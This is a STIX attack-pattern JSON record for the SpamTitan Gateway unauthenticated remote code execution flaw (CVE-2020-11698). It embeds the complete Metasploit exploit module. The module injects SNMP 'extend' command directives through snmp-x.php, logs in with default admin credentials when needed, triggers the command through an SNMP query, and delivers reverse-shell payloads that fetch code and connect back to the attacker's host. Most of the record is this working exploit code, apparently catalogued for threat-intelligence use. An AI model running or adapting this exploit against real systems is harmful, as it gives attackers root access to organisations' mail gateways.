{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ee02ae4f-e09f-4104-b49c-c26c20a2392a",
    "created": "2024-08-14T16:33:29.411206Z",
    "modified": "2024-08-14T16:33:29.411211Z",
    "name": "SpamTitan Unauthenticated RCE",
    "description": " TitanHQ SpamTitan Gateway is an anti-spam appliance that protects against unwanted emails and malwares. This module exploits an improper input sanitization in versions 7.01, 7.02, 7.03 and 7.07 to inject command directives into the SNMP configuration file and get remote code execution as root. Note that only version 7.03 needs authentication and no authentication is required for versions 7.01, 7.02 and 7.07.  First, it sends an HTTP POST request to the `snmp-x.php` page with an `SNMPD` command directives (`extend` + command) passed to the `community` parameter. This payload is then added to `snmpd.conf` by the application. Finally, the module triggers the execution of this command by querying the SNMP server for the correct OID.  This exploit module has been successfully tested against versions 7.01, 7.02 7.03, and 7.07.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/freebsd/webapp/spamtitan_unauth_rce.rb",
            "external_id": "spamtitan_unauth_rce.rb"
        },
        {
            "source_name": "reference",
            "url": "https://www.titanhq.com/spamtitan/spamtitangateway/"
        },
        {
            "source_name": "CVE",
            "external_id": "2020-11698"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  prepend Msf::Exploit::Remote::AutoCheck\n  include Msf::Exploit::Remote::SNMPClient\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::CmdStager\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'SpamTitan Unauthenticated RCE',\n        'Description' => %q{\n          TitanHQ SpamTitan Gateway is an anti-spam appliance that protects against\n          unwanted emails and malwares. This module exploits an improper input\n          sanitization in versions 7.01, 7.02, 7.03 and 7.07 to inject command directives\n          into the SNMP configuration file and get remote code execution as root. Note\n          that only version 7.03 needs authentication and no authentication is required\n          for versions 7.01, 7.02 and 7.07.\n\n          First, it sends an HTTP POST request to the `snmp-x.php` page with an `SNMPD`\n          command directives (`extend` + command) passed to the `community` parameter.\n          This payload is then added to `snmpd.conf` by the application. Finally, the\n          module triggers the execution of this command by querying the SNMP server for\n          the correct OID.\n\n          This exploit module has been successfully tested against versions 7.01, 7.02,\n          7.03, and 7.07.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'Christophe De La Fuente', # MSF module\n          'Felipe Molina' # original PoC\n        ],\n        'References' => [\n          [ 'EDB', '48856' ],\n          [ 'URL', 'https://www.titanhq.com/spamtitan/spamtitangateway/'],\n          [ 'CVE', '2020-11698']\n        ],\n        'CmdStagerFlavor' => %i[fetch wget curl],\n        'Payload' => {\n          'DisableNops' => true\n        },\n        'Targets' => [\n          [\n            'Unix In-Memory',\n            {\n              'Platform' => 'unix',\n              'Arch' => ARCH_CMD,\n              'DefaultOptions' => { 'PAYLOAD' => 'cmd/unix/reverse' },\n              'Payload' => {\n                'BadChars' => \"\\\\'#\",\n                'Encoder' => 'cmd/perl',\n                'PrependEncoder' => '/bin/tcsh -c \\'',\n                'AppendEncoder' => '\\'#',\n                'Space' => 470\n              },\n              'Type' => :unix_memory\n            }\n          ],\n          [\n            'FreeBSD Dropper (x64)',\n            {\n              'Platform' => 'bsd',\n              'Arch' => [ARCH_X64],\n              'DefaultOptions' => { 'PAYLOAD' => 'bsd/x64/shell_reverse_tcp' },\n              'Payload' => {\n                'BadChars' => \"'#\",\n                'Space' => 450\n              },\n              'Type' => :bsd_dropper\n            }\n          ],\n          [\n            'FreeBSD Dropper (x86)',\n            {\n              'Platform' => 'bsd',\n              'Arch' => [ARCH_X86],\n              'DefaultOptions' => { 'PAYLOAD' => 'bsd/x86/shell_reverse_tcp' },\n              'Payload' => {\n                'BadChars' => \"'#\",\n                'Space' => 450\n              },\n              'Type' => :bsd_dropper\n            }\n          ]\n        ],\n        'DisclosureDate' => '2020-04-17',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [CONFIG_CHANGES, ARTIFACTS_ON_DISK]\n        }\n      )\n    )\n    register_options(\n      [\n        Opt::RPORT(80, true, 'The target HTTP port'),\n        OptPort.new('SNMPPORT', [ true, 'The target SNMP port (UDP)', 161 ]),\n        OptString.new('TARGETURI', [ true, 'The base path to SpamTitan', '/' ]),\n        OptString.new(\n          'USERNAME',\n          [\n            false,\n            'Username to authenticate, if required (depending on SpamTitan Gateway version)',\n            'admin'\n          ]\n        ),\n        OptString.new(\n          'PASSWORD',\n          [\n            false,\n            'Password to authenticate, if required (depending on SpamTitan Gateway version)',\n            'hiadmin'\n          ]\n        ),\n        OptString.new(\n          'COMMUNITY',\n          [\n            false,\n            'The SNMP Community String to use (random string by default)',\n            Rex::Text.rand_text_alpha(8)\n          ]\n        ),\n        OptString.new(\n          'ALLOWEDIP',\n          [\n            false,\n            'The IP address that will be allowed to query the injected `extend` '\\\n            'command. This IP will be added to the SNMP configuration file on the '\\\n            'target. This is tipically this host IP address, but can be different if '\\\n            'your are in a NAT\\'ed network. If not set, `LHOST` will be used '\\\n            'instead. If `LHOST` is not set, it will default to `127.0.0.1`.'\n          ]\n        ),\n      ], self.class\n    )\n  end\n\n  def check\n    snmp_x_uri = normalize_uri(target_uri.path, 'snmp-x.php')\n    vprint_status(\"Check if #{snmp_x_uri} exists\")\n    res = send_request_cgi(\n      'uri' => snmp_x_uri,\n      'method' => 'GET'\n    )\n\n    if res.nil?\n      return Exploit::CheckCode::Unknown.new(\n        \"Could not connect to SpamTitan vulnerable page (#{snmp_x_uri}) - no response\"\n      )\n    end\n\n    if res.code == 302\n      vprint_status(\n        'This version of SpamTitan requires authentication. Trying with the '\\\n        'provided credentials.'\n      )\n      res = send_request_cgi(\n        'uri' => '/index.php',\n        'method' => 'POST',\n        'vars_post' => {\n          'jaction' => 'none',\n          'language' => 'en_US',\n          'address' => datastore['USERNAME'],\n          'passwd' => datastore['PASSWORD']\n        }\n      )\n      if res.nil?\n        return Exploit::CheckCode::Safe.new('Unable to authenticate - no response')\n      end\n\n      if res.code == 200 && res.body =~ /Invalid username or password/\n        return Exploit::CheckCode::Safe.new(\n          'Unable to authenticate - Invalid username or password'\n        )\n      end\n      unless res.code == 302\n        return Exploit::CheckCode::Unknown.new(\n          \"Unable to authenticate - Unexpected HTTP response code: #{res.code}\"\n        )\n      end\n\n      # For whatever reason, the web application sometimes returns multiple\n      # PHPSESSID cookies and only the last one is valid. So, make sure only\n      # the valid one is part of the cookie_jar.\n      cookies = res.get_cookies.split(' ')\n      php_session = cookies.select { |cookie| cookie.starts_with?('PHPSESSID=') }.last\n      cookie_jar.clear\n      cookie_jar.add(php_session)\n      remaining_cookies = cookies.delete_if { |cookie| cookie.starts_with?('PHPSESSID=') }\n      cookie_jar.merge(remaining_cookies)\n\n      res = send_request_cgi(\n        'uri' => snmp_x_uri,\n        'method' => 'GET'\n      )\n    end\n\n    unless res.code == 200\n      return Exploit::CheckCode::Safe.new(\n        \"Could not connect to SpamTitan vulnerable page (#{snmp_x_uri}) - \"\\\n        \"unexpected HTTP response code: #{res.code}\"\n      )\n    end\n\n    Exploit::CheckCode::Appears\n  rescue ::Rex::ConnectionError => e\n    vprint_error(\"Connection error: #{e}\")\n    return Exploit::CheckCode::Unknown.new(\n      \"Could not connect to SpamTitan vulnerable page (#{snmp_x_uri})\"\n    )\n  end\n\n  def exploit\n    if target['Type'] == :unix_memory\n      execute_command(payload.encoded)\n    else\n      execute_cmdstager(linemax: payload_info['Space'].to_i, noconcat: true)\n    end\n  rescue ::Rex::ConnectionError\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to the web service\")\n  end\n\n  def inject_payload(community)\n    snmp_x_uri = normalize_uri(target_uri.path, 'snmp-x.php')\n    print_status(\"Send a request to #{snmp_x_uri} and inject the payload\")\n\n    post_params = {\n      'jaction' => 'saveAll',\n      'contact' => 'CONTACT',\n      'name' => 'SpamTitan',\n      'location' => 'LOCATION',\n      'community' => community\n    }\n\n    # First, grab the CSRF token, if any (depending on the version)\n    res = send_request_cgi(\n      'uri' => '/snmp.php',\n      'method' => 'GET'\n    )\n    if res.code == 200\n      doc = ::Nokogiri::HTML(res.body)\n      csrf_name = doc.xpath('//input[@name=\\'CSRFName\\']/attribute::value').first&.value\n      csrf_token = doc.xpath('//input[@name=\\'CSRFToken\\']/attribute::value').first&.value\n      if csrf_name && csrf_token\n        print_status('CSRF token found')\n        post_params['CSRFName'] = csrf_name\n        post_params['CSRFToken'] = csrf_token\n      end\n    end\n\n    res = send_request_cgi(\n      'uri' => snmp_x_uri,\n      'method' => 'POST',\n      'vars_post' => post_params\n    )\n    if res.nil?\n      fail_with(Failure::Unreachable,\n                \"#{peer} - Unable to inject the payload - no response\")\n    end\n    unless res.code == 200\n      fail_with(Failure::UnexpectedReply,\n                \"#{peer} - Unable to inject the payload - unexpected HTTP response \"\\\n                \"code: #{res.code}\")\n    end\n    begin\n      json_res = JSON.parse(res.body)['success']\n    rescue JSON::ParserError\n      json_res = nil\n    end\n    unless json_res\n      fail_with(Failure::UnexpectedReply,\n                \"#{peer} - Unable to inject the payload - Unknown error: #{res.body}\")\n    end\n  end\n\n  def trigger_payload(name)\n    print_status('Send an SNMP Get-Request to trigger the payload')\n\n    # RPORT needs to be specified since the default value is set to the web\n    # service port.\n    connect_snmp(true, 'RPORT' => datastore['SNMPPORT'])\n    begin\n      res = snmp.get(\"1.3.6.1.4.1.8072.1.3.2.3.1.1.8.#{name.bytes.join('.')}\")\n      msg = \"SNMP Get-Request response (status=#{res.error_status}): \"\\\n            \"#{res.each_varbind.map(&:value).join('|')}\"\n      if res.error_status == :noError\n        vprint_good(msg)\n      else\n        vprint_error(msg)\n      end\n    rescue SNMP::RequestTimeout, IOError\n      # not always expecting a response here, so timeout is likely to happen\n    end\n  end\n\n  def execute_command(cmd, _opts = {})\n    if target['Type'] == :bsd_dropper\n      # 'tcsh' is the default shell on FreeBSD\n      # Also, make sure it runs in background (&) to avoid blocking\n      cmd = \"/bin/tcsh -c '#{[cmd.gsub('\\'', '\\\\\\\\\\'').gsub('\\\\', '\\\\\\\\\\\\')].shelljoin}&'#\"\n    end\n    name = Rex::Text.rand_text_alpha(8)\n    ip = datastore['ALLOWEDIP'] || datastore['LHOST'] || '127.0.0.1'\n    if ip == '127.0.0.1'\n      print_warning(\n        'Neither ALLOWEDIP and LHOST has been set and 127.0.0.1 will be used'\\\n        'instead. It will probably fail to trigger the payload.'\n      )\n    end\n\n    # The injected payload consists of two lines:\n    # 1. the community string and the IP address allowed to query this\n    #    community string\n    # 2. the `extend` keyword, the name token used to trigger the payload\n    #    and the actual command to execute\n    community = \"#{datastore['COMMUNITY']}\\\" #{ip}\\nextend #{name} #{cmd}\"\n    inject_payload(community)\n\n    # The previous HTTP POST request made the application restart the SNMPD\n    # service. So, wait a bit to make sure it is running.\n    sleep(2)\n\n    trigger_payload(name)\n  end\nend\n",
    "x_mitre_disclosure_date": "2020-04-17",
    "x_mitre_platforms": [
        "bsd'"
    ]
}